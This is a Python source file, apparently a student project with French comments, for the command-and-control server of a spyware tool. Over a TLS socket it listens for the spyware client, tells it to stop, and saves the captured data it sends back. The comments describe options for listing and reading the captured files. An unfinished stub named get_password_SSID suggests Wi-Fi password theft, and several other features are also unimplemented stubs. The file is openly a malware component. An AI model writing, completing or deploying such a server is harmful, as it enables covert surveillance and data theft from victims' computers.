import socket
import ssl
import os
import sys


# -h/--help : affiche l'aide et les différentes options.
# -l/--listen <port> : se met en écoute sur le port TCP saisi par l'utilisateur et attend les données du spyware.
# -s/--show : affiche la liste des fichiers réceptionnées par le programme.
# -r/--readfile <nom_fichier> : affiche le contenu du fichier stocké sur le serveur du spyware. Le contenu doit
# être parfaitement lisible.
# -k/--kill : arrête toute les instances de serveurs en cours, avertit le spyware de s'arrêter et de supprimer la
# capture.


green = "\x1b[32m"
blue = "\x1b[34m"
red = "\x1b[31m"
orange = "\x1b[38;5;220m"

def get_password_SSID(ip_client):
    print("process of en cours")
    
    

def loop(port,host,client_ssl,ip_client):
    print("Welcome to the lobby of your Spyware")
    cli = input(f"{orange}your server is listenning on the port {port} \n on host : {host} \n Connected to IP : {str(ip_client)} \n -k/--kill for stop the spyware : ")
    if cli == "kill" or cli == "-k":
        print(f"Connexion stop with the client {ip_client} ")
        #stop_socket=str(input(f"Client : ")).encode()
        
        client_ssl.send("STOP".encode())
        filename = 'received_file.txt'
        receive_file(client_ssl, filename)
        print(f"{green}File received successfully , Client is OFF ")
        client_ssl.close()
        exit(1)
    

def display_help():
    print(f"{green}-h/--help : affiche l'aide et les différentes options.")
    print(f"-l/--listen <port> : se met en écoute sur le port TCP saisi par l'utilisateur et attend les données du spyware.")
    print(f"-s/--show : affiche la liste des fichiers réceptionnées par le programme.")
    print(f"-r/--readfile <nom_fichier> : affiche le contenu du fichier stocké sur le serveur du spyware. Le contenu doit")
    print(f"-k/--kill : arrête toute les instances de serveurs en cours, avertit le spyware de s'arrêter et de supprimer la capture")
    
def argument():
    print("")

def lobby(client_ssl):
    print("")
    # print("Welcome to the lobby of your Spyware")
    # msg=client_ssl.recv(1024).decode()
    # print(f"Server : {msg}")

    # #Send message
    # msg=str(input("Client : ")).encode()
    # client_ssl.send(msg) 

#Setting

def ip():
    hostname = socket.gethostname()
    your_ip = socket.gethostbyname(hostname)
    print("Server local IP :", your_ip)
    return str(your_ip)

def receive_file(conn, filename):
    with open(filename, 'wb') as f:
        while True:
            chunk = conn.recv(1024)  # Recevoir un chunk du serveur
            print(f"chunk {chunk}")
            if not chunk:
                break  # Si le chunk est vide, le serveur a terminé l'envoi du fichier
            f.write(chunk)  # Écrire le chunk dans le fichier

def main(param):
    if param == 1:
        display_help()
    if param == 2:
        port = sys.argv[2]
        print(port)
        host = ip()
        #port = 10500
        socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        #Start Server
        socket_obj.bind((host, int(port)))
        socket_obj.listen(5)
        print("Serveur Up")

        # Load the Server Certificate and his private key
        cert_dir = os.path.join(os.getcwd(), "SSL", "CERT")
        cert_file = os.path.join(cert_dir, "cert-server.pem")
        key_file = os.path.join(cert_dir, "cert-key.pem")

        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(cert_file, key_file)

        # Secure Server by ssl
        server_ssl = context.wrap_socket(socket_obj, server_side=True)

        # Accept Connection
        client_ssl, ip_client = server_ssl.accept()
        print(f"Client Connected ! : {ip_client}")

        while True:
            try:
                loop(port,host,client_ssl,ip_client)
                #filename = 'received_file.txt'
                #receive_file(client_ssl, filename)
                #print("File received successfully")


            except Exception as e:
                print(f"Error: {e}")
                break

        print("-- END --")
        client_ssl.close()
        server_ssl.close()
        socket_obj.close()


if __name__ == '__main__':
    param = None
    if len(sys.argv) > 1 and sys.argv[1] == '-h' or len(sys.argv) > 1 and sys.argv[1] == '--help' :
        param = 1
    if len(sys.argv) > 1 and sys.argv[1] == '-l' or len(sys.argv) > 1 and sys.argv[1] == '--listen' :
        if len(sys.argv) > 2 and sys.argv[2] != '':
            param = 2
        else:
            print('please specify a port to listen')
    main(param)
    
    
# -h/--help : affiche l'aide et les différentes options.
# -l/--listen <port> : se met en écoute sur le port TCP saisi par l'utilisateur et attend les données du spyware.
# -s/--show : affiche la liste des fichiers réceptionnées par le programme.
# -r/--readfile <nom_fichier> : affiche le contenu du fichier stocké sur le serveur du spyware. Le contenu doit
# être parfaitement lisible.
# -k/--kill : arrête toute les instances de serveurs en cours, avertit le spyware de s'arrêter et de supprimer la
# capture.